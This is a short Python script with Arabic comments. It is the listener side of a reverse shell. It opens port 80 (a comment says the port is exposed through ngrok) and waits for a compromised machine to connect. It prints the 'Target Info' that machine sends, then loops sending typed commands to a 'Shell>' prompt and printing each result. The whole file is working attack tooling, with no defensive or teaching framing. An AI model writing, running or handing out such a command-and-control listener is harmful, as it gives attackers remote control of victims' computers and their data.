import socket

# البورت اللي إنت فاتحه في ngrok
PORT = 80


def listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", PORT))
    s.listen(5)
    print(f"[*] Waiting for connection on port {PORT}...")

    conn, addr = s.accept()
    print(f"[+] Connected by {addr}")

    # استقبال معلومات النظام أول ما يتصل
    sys_info = conn.recv(4096).decode()
    print(f"[!] Target Info: {sys_info}")

    while True:
        command = input("Shell> ")
        if command.lower() == "exit":
            conn.send(b"exit")
            conn.close()
            break

        if command.strip():
            conn.send(command.encode())
            result = conn.recv(16384).decode()  # استلام نتيجة الأمر
            print(result)


if __name__ == "__main__":
    listener()
